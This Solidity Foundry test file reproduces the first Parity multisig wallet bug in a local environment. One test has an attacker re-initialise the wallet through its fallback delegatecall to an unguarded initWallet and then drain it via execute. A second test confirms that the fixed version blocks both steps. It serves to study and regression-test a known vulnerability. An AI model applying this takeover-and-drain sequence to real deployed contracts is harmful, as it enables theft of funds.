// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {ParityWalletBug1, ParityWalletBug1WalletLibrary} from "../src/ParityWalletBug1.sol";
import {ParityWalletBug1Fixed, ParityWalletBug1FixedWalletLibrary} from "../src/ParityWalletBug1Fixed.sol";

// Differential fixture for the first Parity wallet bug (SWC-105 / SWC-112).
// The Wallet's payable fallback forwards ANY caller-supplied calldata to the
// shared library via delegatecall, and the library's `initWallet` is
// unguarded. Anyone can therefore (re)initialise the wallet as its owner and
// then drain it. The fixed variant removes the generic forward.
contract ParityWalletBug1FixtureTest is Test {
    // The hardcoded library address both the wallet and library reference.
    address internal constant LIB = 0xCAfEcAfeCAfECaFeCaFecaFecaFECafECafeCaFe;

    address internal attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
    }

    function _initWalletCalldata(address who) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = who;
        return abi.encodeWithSignature(
            "initWallet(address[],uint256,uint256)", owners, uint256(1), uint256(0)
        );
    }

    function _executeCalldata(address to, uint256 amount) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("execute(address,uint256,bytes)", to, amount, bytes(""));
    }

    function test_fixtureReproduces() public {
        // Place the shared library code at the address the wallet forwards to.
        ParityWalletBug1WalletLibrary lib = new ParityWalletBug1WalletLibrary();
        vm.etch(LIB, address(lib).code);

        ParityWalletBug1 wallet = new ParityWalletBug1(new address[](0), 1, 0);
        vm.deal(address(wallet), 1 ether);
        uint256 ownersBefore = wallet.m_numOwners();

        // Attacker re-initialises the wallet through the fallback delegatecall,
        // making itself owner #1.
        vm.prank(attacker);
        (bool ok, ) = address(wallet).call(_initWalletCalldata(attacker));
        assertTrue(ok, "fallback forwarded initWallet to the library");
        assertEq(wallet.m_numOwners(), ownersBefore + 1, "wallet re-initialised with attacker as owner");

        // Now an owner, the attacker drains the wallet via execute (m_required == 1).
        vm.prank(attacker);
        (bool ok2, ) = address(wallet).call(_executeCalldata(attacker, 1 ether));
        assertTrue(ok2, "execute ran as owner");

        assertEq(attacker.balance, 1 ether, "attacker drained the wallet");
        assertEq(address(wallet).balance, 0, "wallet emptied");
    }

    function test_fixtureDoesNotReproduce() public {
        ParityWalletBug1FixedWalletLibrary lib = new ParityWalletBug1FixedWalletLibrary();
        vm.etch(LIB, address(lib).code);

        ParityWalletBug1Fixed wallet = new ParityWalletBug1Fixed(new address[](0), 1, 0);
        vm.deal(address(wallet), 1 ether);
        uint256 ownersBefore = wallet.m_numOwners();

        // Same attack: re-initialise through the fallback. The fixed fallback
        // rejects arbitrary calldata, so the forward never happens.
        vm.prank(attacker);
        (bool ok, ) = address(wallet).call(_initWalletCalldata(attacker));
        assertFalse(ok, "fallback rejects arbitrary calldata");
        assertEq(wallet.m_numOwners(), ownersBefore, "wallet not re-initialised");

        // And execute is unreachable through the fallback too.
        vm.prank(attacker);
        (bool ok2, ) = address(wallet).call(_executeCalldata(attacker, 1 ether));
        assertFalse(ok2, "attacker cannot reach execute");

        assertEq(address(wallet).balance, 1 ether, "funds untouched");
        assertEq(attacker.balance, 0, "attacker got nothing");
    }
}
